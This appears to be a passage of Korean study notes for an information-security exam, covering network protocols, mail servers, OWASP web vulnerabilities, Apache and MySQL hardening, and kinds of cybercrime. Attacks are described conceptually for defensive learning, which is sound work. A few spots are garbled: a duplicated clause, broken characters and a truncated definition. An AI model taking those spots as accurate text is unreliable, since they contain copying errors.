|301|Moved Permanently|요청 자원의 위치가 영구적으로 변경됨|
|403|Forbidden(요청한 자원에 대한 접근 차단)|
|404|NotFound(요청한 자원이 존재하지 않음)|
|500|Internal Server Error(내부 서버 오류)|

### FTP
* Active 모드와 Passive 모드가 존재한다.
* Active 모드의 경우 문제가 되는 부분은 클라이언트 쪽에서 방화벽 정책 설정이 되어 있지 않다면 정상적인 서비스가 불가능한 상황이 발생할 수 있다. 제어채널 21/tcp, 데이터채널 20/tcp
  * 능동모드 접속 방법
  * 클라이언트(1024/tcp 이상 포트) -> 서버(21/tcp)
  * 데이터 채널(20/tcp) -> 클라이언트(1024/tcp 이상 포트)
* Passive 모드는 서버 쪽의 방화벽 정책 설정이 적절하지 않으면 정상적인 서비스가 불가능한 문제점이 있다. 제어채널 21/tcp, 데이터채널 1024이상/tcp
* 제어 채널과 데이터 채널을 생성하여 파일을 송수신한다.
* 제어 채널은 FTP 명령을 전달하기 위한 채널로 클라이언트가 종료되거나 FTP 세션이 끝날때까지 유지된다.
* 데이터 채널은 데이터를 전달하기 위한 채널로 각각의 파일의 전송이 시작될 때마다 설정되고 파일 전송이 끝나면 해제된다.
* ftpusers 에서 사용자 접근 제한을 할 수 있다.
* **FTP Bounce** : FTP 서버가 데이터를 전송할 때 목적지가 어디인지 검사하지 않는 설계상의 특성을 이용한 공격이다. 또한 익명의 FTP 서버를 이용하여 공격자는 자신을 숨기고 내부 시스템의 포트를 스캔할 수 있으며 메일의 헤더 부분을 조작ㅎ  ㅏ여 가짜 메일을 만들어내부 메일 서버에 보낼 수도 있다.
* **Anonymous FTP 공격** : 패스워드를 요구하지 않는 FTP 설정의 취약점을 이용한 공격이다. 예를 들어, 서버에 쓰기 권한이 잘못 부여되면 공격자는 악성코드를 서버에 삽입할 수 있고 이를 익명의 다수가 내려받는 문제가 발생할 수 있다.
* TFTP : 접근 제어를 제대로 하지 않으면 인증기능이 없는 TFTP 취약점을 이용하여 공격자가 임의의 파일에 접근할 수 있는 문제점이 있다. 따라서 TFTP 서비스가 불필요한 경우에는 이를 제거하고, 필요한 경우에는 secure mode로 운영한다. -s 옵션으로 secure mode 설정한다. 69/udp

### SNMP (Simple Network Management Protocol)
* 응용 계층의 프로토콜이며, 사용되는 메시지는 단순히 요청과 응답 형식의 프로토콜에 의해 교환되기 때문에 SNMP는 전송 계층 프로토콜로 UDP를 사용한다. 일반적으로 SNMP는 161번 포트, SNMP TRAP 메시지는 162번 포트로 전송된다.
* TCP/IP 네트워크 장치로부터 여러 관리 정보를 자동으로 수집하고, 실시간으로 상태를 모니터링 및 설정할 수 있는 인터넷 표준 프로토콜이다.
* community String 은 SNMP 데몬과 클라이언트가 데이터 교환하기 전에 인증을 위해 사용되는 일종의 패스워드로, 초기값으로 public 또는 private가 설정되어 있다.
* SNMP에서는 RO(Read Only)와 RW(Read Write) 모드를 제공한다. 쓰기 권한이 있으면 중요 설정을 수정할 수 있는 심각한 보안 문제를 유발할 수 있으므로 사용 자제 권고한다.
* SNMP version 3에서 인증을 위해 암호화가 제공된다.
* 이벤트 리포팅 : 에이전트가 이벤트 발생 시 이를 매니저에게 알리는 방식
* **관리 정보 베이스(MIB)** : 관리자가 조회하거나 설정을 할 수 있는 객체들의 데이터베이스이다.
* **ASN.1** : 데이터와 데이터의 속성들을 설명하기 위한 언
* **BER** : 메시지로의 실제 비트변환을 말한다.

### NMS (Network Management System)
* 에이전트의 이벤트 정보를 매니저에게 전달하는 방법은 폴링과 이벤트보고가 있다.
* 이벤트 정보를 서버(syslog 서버)로 전송하는 syslog 방식도 있다.

### syslog
* 다양한 장비의 로그 메시지를 원격 로그 수집기로 보내 로깅과 분석을 수행하기 위한 UDP 기반의 인터넷 표준 프로토콜

### mail
* MTA (Mail Transfer Agent) : 메일 서버 프로그램으로 수신한 메일을 분석하여 수신자가 자신이 아닌 메일 주소라면 해당 주소의 메일 서버로 전송하고 수신자가 자신의 메일 주소라면 MDA를 통해 각 사용자 메일함에 저장
* MDA (Mail Delevery Agent) : 사용자 메일함에 메일을 저장해주는 프로그램으로 메일이 최종 수신 메일 서버에 도착했을 때 서버는 MDA에 메일을 전달하고 MDA는 해당 사용자 메일함에 저장한다.
* MUA (Mail User Agent) : 사용자가 메일을 송수신하기 위해 사용하는 메일 클라이언트 프로그램으로 메일을 작성하거나 메일함에 도착한 메일을 확인하는 기능을 수행한다.
* MRA (Mail Retrieval Agent) : 메일 클라이언트가 확인을 요청하는 메일을 사용자 메일함에서 사용자로 전달해주는 프로그램으로 MUA와 MRA간 통신은 POP3 또는 IMAP 프로토콜을 기반으로 한다.
* SMTP (Simple Mail Transfer Protocol) : 메일 클라이언트(MTA) 또는 송수신 메일 서버(MTA) 간에 메일 전송을 위해 사용하는 프로토콜로 tcp/25번 포트를 사용한다.
* SMTPS : SMTP 통신 구간에 SSL/TLS 보안을 적용한 프로토콜로 tcp/465 포트를 사용한다.
* POP3 (Post Office Protocol version 3) : 메일 클라이언트가 메일 서버로부터 메일을 수신할 수 있도록 해주는 프로토콜로 tcp/110번 포트를 사용한다.
* POP3S : POP3 통신 구간에 SSL/TLS 보안을 적용한 프로토콜로 tcp/995 포트를 사용한다.
* IMAP (Internet Mail Access Protocol) : 메일 클라이언트가 매일 서버로부터 메일을 수신할 수 있도록 해주는 프로토콜로 tcp/143번 포트를 사용한다. POP3와 다른점은 서버에서 복사해오는 방식이기 때문에 서버에 해당 메일 계속 잔류
* IMAPS : IMAP 통신 구간에 SSL/TLS 보안을 적용한 프로토콜로 tcp/993 포트를 사용한다.
* **폭탄메일** : 상대방에게 피해를 줄 목적으로 특정한 사람이나 특정한 시스템을 대상으로 수천, 수만통의 전자우편을 일시에 보내거나, 대용량의 전자우편을 지속해서 보내 결국 해당 사이트의 컴퓨터 시스템에 고장을 일으키는 기술이다.
* **스팸메일** : PC통신이나 인터넷 ID를 가진 사람에게 일방적 대량으로 전달되는 전자우편으로 발신지와 수신자가 아무런 관계가 없으며 정크메일이라고도 불린다. 무차별로 살포되어 시간과 비용을 낭비하게 하여 ISP와 PC 관계가 없으며 정크메일이라고도 불린다. 무차별로 살포되어 시간과 비용을 낭비하게 하여 ISP와 PC 통신업체에서 필터링 정책을 시행하고 있으나 중계 스팸은 필터링을 우회하기도 한다. 실시간 RBL(Real Black List)로 대처하기도 한다.

### sendmail
* 센드메일은 인터넷 전자 메일의 표준규약인 SMTP 프로토콜을 통해서 메일 서버 간에 메일을 주고받는 역할을 하는 무료 오픈소스 소프트웨어를 말한다.
* 메일 릴레이 : 메일 서버 외부에서 메일 서버를 경유하여 다른 메일 서버로 메일을 발송하는 것을 말한다. 이때 경유한 메일 서버를 메일 릴레이 서버라고 한다.
* sendmail 관련 주요 파일 및 디렉터리
* **PGP (Pretty Good Privacy)** : 1991년 필 짐머만에 의해 개발된 이메일 보안 프로토콜로 사용하기 편리하고 안전성이 높아서 대중적으로 널리 사용되고 있다. 이메일 보안 요구 사항 중 기밀성 보장을 위해 대칭키 암호화와 공개키 암호화를 결합하여 지원하고 메시지 무결성, 송수신자 인증 및 부인방지를 위해 해시 함수와 공개키 암호화 기반의 디지털 서명 서비스를 제공한다.
* Procmail : 받은 메일에서 보낸 사람, 제목, 크기, 내용 등의 단일 또는 다중기준으로 메일 필터링이 가능하다.
* Santitizer : promail ruleset 옵션을 통해 확장자를 이용한 필터링, MS Office 매크로에 대한 검사 기능, 악성 매크로에 대한 source 기능, 감염된 메시지 보관 장소 설정 기능 등을 제공한다.
* Inflex : 메일 서버에서 로컬이나 외부로 나가는 e-mail에 대한 Inbound와 Outbound 정책을 세워 메일 필터링이 가능하다. 첨부파일만 필터링할 수 있다.
* SpamAssassin : Apache 그룹을 통해 Open Source Project로 진행되고 있다. Perl로 만들어졌으며 헤더 내용, White List와 Black List, RBL 등의 다양한 분류로 메일 필터링이 가능하다.
* Received : 스펨 메일 발송 근원지 파악 등을 위해 이메일 발송 경로(IP 주소)를 역추적하는 방법으로 메일 헤더 Received 헤더를 분석함으로써 실제 메일을 발송시킨 메일 서버의 주소를 추적할 수 있다.
  * from : 발송 호스트
  * by : 수신 호스트
  * id : 메일 고유 식별자
  * for : 수신자 메일주소

|파일(디렉터리)|설명|
|:-|:-|
|/usr/sbin/sendmail|sendmail 주 데몬 실행파일|
|/usr/sbin/makemap|sendmail 맵 생성 실행파일|
|/var/spool/mqueue|메일 큐 디렉터리|
|/var/spool/mail|개별 사용자 메일함|
|/etc/mail/access|스팸메일 및 릴레이 차단을 위한 설정 파일 </br>access 파일은 설정을 위한 텍스트 파일로 실제 정책을 적용하기 위해서는 makemap 명령을 이용하여 access.db 파일을 생성해야 한다.|
|/etc/mail/sendmail.cf|sendmail 설정 파일|

* access 파일 형식 : [적용 대상 지정] [처리 방식 지정]

|처리 방식|의미|
|:-:|:-|
|OK|지정한 대상의 메일을 조건 없이 모두 허용한다.|
|RELAY|지정한 대상의 메일 릴레이를 허용한다.|
|REJECT|지정한 대상의 메일을 모두 거부한다.(거부 메시지 보냄)|
|DISCARD|지정한 대상의 메일을 모두 폐기한다.(폐기 메시지 보내지 않음)|
|501 message|지정한 메일주소와 일치하면 메일을 거부하고 설정한 거부 메시지를 보낸다.|

* ```makemap hash /etc/mail/access.db < /etc/mail/access``` -> snedmail 서버 소프트웨어의 스팸 메일 방지를 위한 메일 릴레이 설정을 위해서는 다음 명령을 통한 access DB 생성이 필요하다.
* makemap : 텍스트 형식 데이터베이스 파일을 sendmail 설정으로 변환하기 위한 명령어이다.

### OWASP (Open Web Application Security Project)
* **Injection** : 신뢰할 수 없는 데이터가 명령어나 질의문의 일부분으로 인터프리터로 보내질 때 발생한다. 공격자의 악의적인 데이터는 예상하지 못하는 명령을 실행하거나 적절한 권한 없이 접근하도록 인터프리터를 속일 수 있다.
* **OS Command Injection** : 적절한 검증 절차를 거치지 않은 사용자 입력값이 운영체제 명령어의 일부 또는 전부로 구성되어 실행되는 경우, 의도하지 않은 시스템 명령어가 실행되어 부적절하게 권한이 변경되거나 시스템 동작 및 운영에 악영향 미침
* **XSS** : 애플리케이션이 신뢰할 수 없는 데이터를 가져와 적절한 검증이나 제한 없이 웹 브라우저로 보낼 때 발생한다. 공격자가 피해자의 브라우저에 스크립트를 실행하여 사용자 세션 탈취, 웹 사이트 변조, 악의적인 사이트로 이동할 수 있다.
  1. Stored XSS : 악성 스크립트를 DB 등에 저장해 놓으면 게시판, 댓글 등 해당 자료를 요청했을 때 악성 스크립트가 삽입되어 클라이언트 측에서 동작
  2. Reflected XSS : 악성 스크립트가 포함된 URL 링크를 클릭해 취약한 웹 사이트에 전달되고 해당 악성 스크립트가 삽입되어 클라이언트 측에서 동작
* XSS와 CSRF 차이점은 서로 클라이언트 측에서 악성 스크립트가 실행되지만 XSS에서는 클라이언트측에서 악의적인 행위가 발생하고, CSRF는 서버측에서 악의적인 행위가 발생한다. 
* **CSRF** : 로그온된 피해자의 취약한 웹 애플리케이션에 피해자의 세션 쿠키와 기타 다른 인증정보를 자동으로 포함하여 위조된 HTTP 요청을 강제로 보내도록 하는 것이다. 이것은 공격자가 취약한 애플리케이션이 피해자로부터의 정당한 요청이라고 오해할 수 있는 요청들을 강제로 만들 수 있다.
* **인증 및 세션 관리 취약점** : 계정 토큰과 세션 토큰이 적절히 보호되고 있지 않다. 공격자는 패스워드나 키, 세션, 쿠키, 기타 인증 관련 토큰을 공격하여 인증을 우회하고 다른 사용자의 ID를 가장할 수 있다.
* **웹 프록시** : 웹을 이용한 해킹 공격에 가장 활발히 사용되는 도구로 클라이언트가 요청한 HTTP Request, Response 정보 중간에서 가로채 필터링을 우회하거나 서버에 전송되는 데이터를 조작해 허가되지 않는 곳에 정보를 훔쳐보거나 변경, 삽입 등을 가능하게 한다. 대표적인 제품으로 Paros, Burp 등이 있다.
* **SQL Injection** : 데이터베이스와 연동된 웹 애플리케이션에서 공격자가 입력 폼 및 URL 입력란에 SQL 문을 삽입하여 DB로부터 정보를 열람할 수 있는 공격 방법이다.
  * %27 : (')
  * %3D : (=)
  * %2D : (-)
  * %20 : ( )
  * + : ( )
  * **Prepared statement** : 일반적인 질의문은 요청 시마다 질의문을 생성하여 실행시키는 방식이지만 선처리 질의문은 외부로부터의 입력값을 제외한 질의문 부분을 미리 컴파일하여 생성한 후 반복적으로 입력값만 매개변수로 전달하여 질의문 실행 방식이다. 악의적인 입력값을 삽입하더라도 SQL 질의문 자체에 영향을 미치지 않는다.
* **파일 업로드 공격** : 서버 측에서 실행될 수 있는 스크립트 파일이 업로드 가능하고, 이 파일을 공격자가 웹을 통해 직접 업로드 시킬 수 있는 경우 시스템 내부의 명령어를 실행하거나 외부와 연결하여 시스템을 제어할 수 있는 공격 방법이다.
* 파일 업로드 공격에 대한 취약점 확인은 악성 스크립트 파일을 업로드 하여 성공하면 취약한 것으로 판단하고, 방어 방법은 파일타입, 확장자 등을 확인하여 업로드 차단한다. 그리고 업로드 파일 저장할 전용 디렉터리 별도 생성 후 디렉터리에 있는 서버 사이드 스크립트가 실행되지 않도록 설정
* **Path Traversal 공격** : 상위 디렉터리로 이동하는 공격
* **웹쉘** : 악의적인 목적으로 웹서버 내 임의의 명령을 실행할 수 있는 서버 스크립트 파일을 말하며 다양한 언어(asp, jsp, php 등)로 만들어진다.
* allow_url_fopen 기능은 PHP에서 include, require 등의 함수를 이용하여 외부 파일을 URL 형식으로 읽어올 수 있도록 해주는 기능으로 보안에 취약한 설정이기 때문에 허용하지 않는 것을 권장한다. php.ini 설정파일에서 allow_url_fopen Off로 설정
* display_errors 값이 Off로 되어있다면, PHP 실행 중 에러 정보 노출을 방지할 수 있다. 개발 시에는 on으로 해놓아 자세한 에러 정보를 보며 디버깅 작업을 할 수 있다. php.ini 설정파일에서 display_errors Off
* **HTTP 응답 분할 취약점** : 개행문자는 HTTP 프로토콜에서 각각의 헤더와 헤더부의 끝을 구분하기 위해 사용하며 CR(%0D), LF(%0A)로 구성된다. CR은 커서의 위치를 가장 앞으로 이동시키고 LF는 커서의 위치를 다음 행으로 이동시킨다. 대응 방법으로 HTTP 응답 헤더에 입력되는 값에 대해 개행문자를 제거 또는 치환하는 등의 입력값 유효성 검사를 하여 헤더가 두 개 이상으로 분리되는 것을 방지할 수 있다.
* **딥링크** : 모바일 앱마다 개별적으로 생성한 딥링크에 대한 인증이 미흡할 경우 발생 할 수 있다. 공격자가 조작한 링크로 사용자가 접속하면 앱 내 자바스크립트 권한 부여를 통해 민감한 개인정보를 호출할 수 있고 이를 통해 공격자 사이트에 개인정보가 전달될 수 있다.
* **디렉터리 리스팅** : 웹서버의 미흡한 설정으로 인해 인덱싱 기능이 활성화 되어 있을 경우, 공격자가 강제 브라우징을 통해 서버 내의 모든 디렉터리 및 파일 목록을 볼 수 있는 취약점을 말한다. 해당 취약점이 존재하면 웹서버의 구조뿐만이 아니라 백업 파일이나 소스 파일 등 안 되는 파일이 노출될 수 있는 문제점이 있다. 해결방안은 httpd.conf의 Directory 지시자, Options 섹션의 Indexes 를 지워야 한다. ISS 웹서버에서는 디렉터리 검색 부분 체크 해제
* **심볼릭 링크 리스팅** : httpd.conf 파일의 Directory 지시자의 Options 섹션에 FollowSymLinks 제거

### 개발 보안 관리의 기본 원칙
* 최종 통제 메커니즘은 반드시 서버에서 수행되어야 한다.
* 중요정보 전송 시 POST 메소드 및 SSL/TLS를 적용한다.
* 중요정보를 보여주는 페이지는 캐시를 no-cache로 설정한다.
* DB에 저장된 중요정보가 SQL-Query로 열람이 가능한지 확인한다.
* 세션ID나 암호화된 쿠키값이 명백히 랜덤하게 생성되는지 확인한다.
* 적절한 암호화 알고리즘이 제대로 적용되었는지 검증한다.

### Apache
* **LimitRequestBody** : 아파치 서버의 업로드 디렉터리에 업로드 파일 크기를 5M(5,000,000byte)로 설정 (예 LimitRequestBody 5000000)
* **robots.txt** : 로봇배제표준은 검색로봇에 대한 웹 사이트의 디렉터리 및 파일들에 대한 검색조건을 명시해놓은 국제규약으로 접근 제한에 대한 설정을 robots.txt 파일에 기술한다.
* ServerRoot : 웹서버가 설치된 최상위 디렉터리 경로 설정 (httpd.conf)
* PidFile : 웹서버가 기동될 때 자신의 PID를 기록할 파일의 경로 설정
* Listen : 웹서버의 리스닝/서비스 포트 지정
* DocumentRoot : 웹 애플리케이션 최상위 디렉터리 지정
* ServerSignature : 웹서버에서 생성한 에러 메시지 등에 웹서버, OS, 모듈 정보를 제공할지 여부 (off로 설정)
* ServerAdmin : 클라이언트에 전달되는 에러 메시지에 포함될 관리자 메일 주소를 설정
* User, Group : 서버 프로세서를 실행할 사용자와 그룹 설정 (보안을 위해 root아닌 nobody)
* Timeout : 세션 유지 시간(300초)
* MaxClient : 동시 연결 가능한 클라 최대 개수
* KeepAlive : 클라와 서버 프로세스간의 연결을 일정 조건에 따라 지속시켜 동일한 연결을 통해 클라의 다수 요청을 처리 기능 (On 사용, Off 사용안함)
* MaxKeepAliveRequests : KeepAlive 사용 시 연결 지속할 동안 허용할 최대 요청건수 (100)
* KeepAliveTimeout : KeepAlive 사용 시 클라와 서버 연결 지속하는 동안 클라의 마지막 요청 이후 다음 요청을 대기하는 시간 초 (5)
* DirectoryIndex : 클라가 디렉터리만 명시하여 요청할 때 이를 처리할 기본 페이지를 지정 (index.html, index.php)
* Errorlog : 에러 로그파일 경로 지정 (/var/log/httpd/error_log)
* **ServerTokens** : 아파치 웹서버의 버전과 취약점을 찾아내는 데 유용한 정보를 제공하므로 이러한 배너 정보를 숨기는것이 안전한데 ServerTokens 지시자를 수정함으로써 가능하다.
  * Prod : Server:Apache
  * Min : Server:Apache/1.3.0
  * OS : Server:Apache/1.3.0(Unix)
  * Full : Server:Apache/1.3.0(Unix) PHP/3.0 MyMod/1.2
* **access_log** : 클라이언트의 웹서버 접속기록(클라이언트의 자원 요청과 웹서버의 응답 정보)을 남긴다.
* **error_log** : 클라이언트 요청에 대한 웹서버 처리 중에 발생하는 오류 및 디버깅 메시지 등을 남긴다.
* 각각의 로그파일은 ```cat httpd.conf | grep '^CustomLog'``` <- access_log
* ```cat httpd.conf | grep '^ErrorLog'``` <-- error_log
* 파일 다운로드 취약점을 대응 방법은 파일경로를 변경할 수 있는 ../문자열 필터링, 외부에서 입력한 파일경로와 이름에 대해 허용하는 경로 이외의 디렉터리와 파일에 접근할 수 없도록 처리한다.
* 파일 업로드 취약점을 제거하기 위해 파일 업로드 디렉터리 .htaccess 설정 파일을 만들어 설정한다.
```
의미 : FileMatch 지시자를 이용하여 .ph, .inc, .lib 등의 서버 사이드 스크립트 파일에 대해 직접 URL 호출 못하도록 설정
이유 : 파일 업로드 디렉터리에 악의적인 서버 사이드 스크립트가 업로드된 경우라도 외부에서 직접 URL로 호출하는 것을 차단하여 서버 사이드 스크립트가 실행되지 않도록 한다.
<FileMatch "\.(ph|inc|lib)">
  Order allow, deny
  Deny from all
</FileMatch>

의미 : AddType 지시자를 이용하여 파일 업로드 디렉터리에 위치한 .php, .cgi 등 서버 사이드 스크립트 파일들의 MME Type을 text/html로 재조정한다.
이유 : 타입을 HTML 타입으로재조정하여 서버에서 실행되지 않도록 한다.
AddType text/html .html .htm .php .php3 .php4 .phtml .phps .in .cgi .pl .shtml .jsp
```
* passthru() : exec(), shell_exec(), system()함수와 비슷한 PHP 환경에서의 함수입니다. passthru 매개변수는 운영체제 명령을 실행할 수 있습니다.
```
192.168.159.131 -> 클라이언트 호스트 주소
[13/Sep/2014:11:00:00 +0900] -> 요청 시간
"Get /home/index.jsp HTTP/1.1" -> 요청 정보
200 -> 응답 상태코드
234 -> 응답 데이터 수
"http://www.attacker.co.kr/default.jsp" -> refeer 요청 헤더 정보
"Mozilla/5.0 (Windows NT6.1; WOW64; Trident/7.0;)" -> user-agent 정보보
```
### 사이버 범죄
* 컴퓨터 범죄란 컴퓨터 및 프로그램, 데이터 등에 대해 행하여지는 범죄 또는 각종 범죄행위에 컴퓨터를 사용하는 범죄를 말한다.
  * 컴퓨터 운영에 장애를 일으키는 컴퓨터 파괴나 컴퓨터 내 자료의 부정 조작, 컴퓨터 스파이 활동 등을 통칭한다. 
* 컴퓨터 범죄라는 용어는 1990년대부터 인터넷이 보편화되면서 단순히 컴퓨터로 대상을 국한하지 않고 유무선 네트워크로 연결되는 인터넷이라는 공간에서 발생하는 범죄로 확대되면서 "사이버 범죄"라는 용어로 점차 일반화되었다.
  * 따라서 사이버 범죄는 컴퓨터 범죄의 형태를 포함하여 인터넷이라는 사이버 공간에서 발생하는 모든 유형의 범죄를 포함하는 포괄적인 의미로 정의된다.

#### 데이터 디들링 (data diddling)
* 프로그램에서 처리할 원시 데이터 자체를 위변조하거나 미리 바꿔치기할 데이터를 준비해 두었다가 데이터를 추가하는 수법으로 데이터의 감사, 변환, 처리 등 데이터에 접근이 가능한 모든 내부인에 의해 발생할 수 있다.

#### 살라미 기법 (salami technique)
* 이탈리아 음식인 살라미 소시지를 조금씩 얇게 썰어먹는 모습을 연상시킨다는 의미로 붙여진 이름이다.
* 프로그램을 악의적으로 변조하여 특정 프로그램 모듈의 금액 연산 과정에서 발생하는 끝자리를 반올림 혹은 버림 하면서 매우 적은 금액이 남을 때, 이를 지속적으로 자신의 계좌로 보내는 수법으로 전형적인 예로 금융기관의 금리계산 프로그램 담당자가 프로그램을 변조해서 원래는 버려져야 할 이자의 끝자리를 자신의 계좌로 보내는 예를 들 수 있다.
* 프로그램의 변조 사실을 알아내기가 매우 어렵고 피해 당사자가 눈치채지 못할 정도의 매우 적은 금액이기 때문에 피해 당사자도 그 사실을 알기가 매우 어렵다.

#### 은닉 채널 (convert channel)
* 은닉 채널은 기본 채널에 기생하여 다른 사람들에게는 보이지 않게 메세지를 주고받는 행위를 말한다. 대표적으로 멀티미디어 데이터(이미지 등)에 메시지를 숨기는 스테가노그래피나 ICMP, DNS, TCP 등의 통신 프로토콜을 이용하여 메세지를 숨기는 방식 등이 있다.
  * 스테가노그래피 : 전달하려는 기밀 정보를 이미지 파일이나 MP3 파일 등에 암호화하여 숨기는 기술
  * 예) DNS 은닉 채널 : DNS TXT 레코드를 이용하여 임의의 명령어를 주고받는 악성코드가 발견된 사례가 있으며 해당 악성코드의 경우 공격자에 의해 사전 정의된 도메인에 대한 TXT 레코드 질의를 수행하고 그 응답으로 인코딩된 악의적인 명령어를 받아서 동작한다.
* 네트워크 트래픽을 이용한 은닉 채널 생성 기법은 데이터링크 계층, 네트워크 계층, 전송 계층, 응용 계층 등 다양한 계층이 이용될 수 있다. 다양한 프로토콜의 필드 중 잘 사용하지 않는 필드를 이용하여 은닉 메시지를 주고받는 방식으로 다음과 같은 방법이 있다.
  * 사용하지 않는 헤더 필드를 이용하는 방법 : 프로토콜 명세에 특정값을 사용하도록 명시하지 않거나 수신자가 값을 확인하지 않는 헤더 필드를 이용하여 은닉채널을 구성한다.
  * 확장(옵션) 기능을 이용하는 방법 : 많은 프로토콜은 확장성을 고려하여 확장 헤더를 정의하고 이를 선택적으로 사용할 수 있도록 하므로 확장 헤더를 활용하여 은닉 채널을 구성한다.

#### 논리 폭탄 (Logic bomb)
* 프로그램에 특정 날짜나 시간과 같은 조건을 설정하고 그 조건을 만족하면 악의적인 기능을 수행할 수 있도록 의도적으로 삽입된 코드를 말한다.
* 예를 들어, 특정 조건이 되면 컴퓨터의 운영에 필요한 기본 파일을 삭제하거나, 데이터를 파괴하거나 변조해 예상치 못한 컴퓨터 장애를 윱라하는 경우를 들 수 있다.

#### 트랩 도어 (trap door)
* 시스템 보안이 제거된 비밀 통로로 서비스 기술자나 유지 보수 프로그램 작성자의 액세스 편의를 위해 시스템 설계자가 고의로 만들어 놓은 시스템의 보안 구멍을 말하며 '백도어'라고도 한다.
* 대규모의 응용 프로그램이나 운영체제 등의 개발에서 원활한 개발을 위한 목적으로 만든 것으로 최종 단계에서 삭제되어야 하는 트랩 도어가 남아있을 경우 컴퓨터 범죄에 악용될 수 있다.

### 데이터베이스 보안
* 데이터베이스 보안을 위한 요구사항 5가지
  1. 접근 통제 : 비인가자에 의한 데이터 접근 차단
  2. 추론 방지 : 기밀이 아닌 데이터로부터 기밀 정보 얻는 가능성 차단
  3. 데이터 무결성 : 비인가자에 의한 데이터의 생성, 변경 및 삭제 보호
  4. 감사 기능 : 모든 데이터 접근에 대한 감사 기록(로그) 생성
  5. 사용자 인증 : 데이터에 접근하는 사용자에 대한 신뢰성 있는 신분 확인
* DCL (Data Control Language, 데이터 제어어)
  1. GRANT : 사용자에게 데이터베이스 객체에 권한 부여
      * 형식) GRANT "권한" ON "데이터베이스 객체" TO "사용자"
      * GRANT SELECT ON MyDB.TEST TO algisa : algisa 사용자에게 MyDB 데이터베이스의 TEST 테이블의 조회 권한부여
  2. REVOKE : 사용자에게 데이터베이스 객체에 권한 삭제
      * REVOKE "해제할 권한" ON "데이터베이스 객체" FROM "사용자"
      * REVOKE SELECT ON MyDB.TEST FROM algisa : algisa 사용자에게 MyDB의 TEST 테이블의 조회 권한해제
  3. DENY : 사용자에게 데이터베이스 객체에 대한 해당 권한 금지
      * DENY "금지할 권한" ON "데이터베이스 객체" TO "사용자"
      * DENY INSERT ON MyDB.TEST TO algisa : algisa 사용자에게 MyDB의 TEST 테이블에 대한 삽입 권한금지
* **집성** : 낮은 보안등급의 정보를 조각별로 조합하여 높은 등급의 정보를 알아내는 방식으로 개별 항목의 정보보다 종합적인 정보의 보안등급이 높은 경우 심각한 문제가 발생
* **추론** : 접근할 수 있는 정당한 사용자 계정으로 수집한 정보를 통해 유추하여 높은 보안등급의 정보에 접근하는 방식
* **데이터 디들링** : 원본 정보 자체를 위변조해 끼워 넣거나 바꿔치기하는 수법으로, 디스크 속에 대체할 자료를 만들어 두었다가 데이터를 추가하는 방식
* **접근통제** : 인증된 사용자에게 허가된 범위 내에서 데이터베이스 시스템 내부의 정보에 대한 접근을 허용하는 기술
MYSQL 서버 사용 시, 외부에서 네트워크 사용자의 접근을 제한하고 로컬에 설치된 애플리케이션에 의해서만 접속하도록 보안 설정을 하기 위해서는 Mysql 설정파일인(my.cnf)에 skip-networking 옵션을 추가해야 한다.
```
[mysqld]
datadir=/var/lib/mysql
socket=/var/lib/mysql/mysql.sock
skip-networking
```
* **추론통제** : 통계적인 자료에서 주로 발생하는 것으로 간접적으로 노출된 데이터를 통해 다른 데이터가 공개되는 것을 제어
* **흐름통제** : 정보의 흐름을 볼 때 보안등급이 높은 객체에서 보안등급이 낮은 객체로 정보가 흐르는 것을 제어하는 방법을 말한다.
* mysqldump : MYSQL 데이터베이스 서버를 중단하지 않고 데이터 백업 도구
  * **핫 백업** : 데이터베이스 서버를 중단하지 않고 온라인 상태로 유지한 채 데이터를 백업하는 방식
  * **콜드 백업** : 데이터베이스 서버를 중지한 후 데이터를 백업하는 방식
 
### SET (Secure Electronic Transaction)
#### 개요
* 신용카드회사인 비자와 마스터카드가 합동으로 개발하였으며, 인터넷상에서 신용카드를 이용한 상품구매 시 안전한 대금결제과정 처리를 위해 RSA 암호화와 인증 기술을 이용한다.
* 네트워크상에서 민감한 개인금융정보를 안전하게 전송하기 위해 개발된 프로토콜인데 현재까지 가장 안전한 전자결제방안으로 평가되고 있다.

#### SET 참여주체
* 사용자 : 지불카드를 사용하여 인터넷에서 상품, 서비스를 구매하는 자
* 가상 상점 : 인터넷상에서 카드소지자에게 상품, 서비스를 제공하는 자
* 카드 발급사 : 카드소지자의 계좌 개설, 지불카드를 발행하는 금융기관
* 지불처리 은행 : 상점과 계좌를 개설한 금융기관
* 지불 게이트웨이 : 지불처리 은행 또는 제삼자에 의해 운영되는 장치로서 상점이 요청한 카드소지자의 지급정보를 이용하여 해당 금융기관에 승인 및 결제를 요청하는 기존의 카드 지불 네트워크로의 통로
* 인증기관(CA : Certification Authority) : SET 참여자에게 공개키 인증서를 발행하는 기관
* **이중서명** : 사용자가 지불정보는 상점에 숨기고 주문정보는 은행에 숨김으로써 사용자의 프라이버시가 보호되도록 하는 것이다.
1. 암호화
   * 송신자는 메시지를 압축하고, 압축된 메시지를 다시 송신자의 비밀키로 암호화하여 전자서명을 만든다.
   * 원문 메시지에 전자서명을 첨부한 다음, 이를 대칭키로 암호화한다.
   * 그 다음 사용된 대칭키를 다시 수신자의 RSA 공개키로 암호화한 후 암호문과 함꼐 전송한다(전자봉투)
2. 복호화
   * 우선 전자봉투에서 수신자의 RSA 비밀키로 복호화하여 대칭키를 알아낸다.
   * 대칭키를 이용하여 전자서명과 원문 메시지를 구한다.
   * 원문 메시지를 압축하여 메시지 다이제스트를 구하여 비교한다.
3. SET 프로토콜에서 사용하는 디지털서명 공개키 알고리즘 : RSA

### DNS Spoofing 
* 공격대상자가 DNS 질의를 수행하면 공격자가 이를 스니핑하고 있다가 공격대상자에게 조작된 DNS 응답을 보내 가짜 사이트로 접속을 유도하는 공격기법이다.
* 공격 대응 방법 : 중요한 사이트의 IP 주소에 대해서는 DNS 질의보다 우선순위가 높은 hosts 파일을 통해 관리한다.

### HTTP Cookie
* Set-Cookie : 서버에서 쿠키를 생성하여 웹 브라우저에 전달할 때 사용하는 HTTP 응답 헤더
* Cookie : 웹 브라우저가 쿠키를 서버로 전달할 때 사용하는 HTTP 요청 헤더
* HttpOnly : 쿠키에 httponly 속성을 설정하면 클라이언트에서 스크립트를 통한 해당 쿠키 접근을 차단하기 때문에 쿠키 탈취를 위한 XSS 등의 공격에 효과적으로 대응할 수 있다.
* Secure : 쿠키에 secure 속성을 설정하면 클라이언트에서 HTTPS 통신일 경우에만 해당 쿠키를 전송하기 때문에 전송 중에 평문 쿠키가 노출되는 것을 방지한다.
* Expires : 쿠키의 유효기간을 설정하는 옵션으로 유효기간을 최소한으로 설정하여 클라이언트의 하드디스크 등에 지속해서 남아 공격자에게 노출되는 위험을 방지할 수 있다.
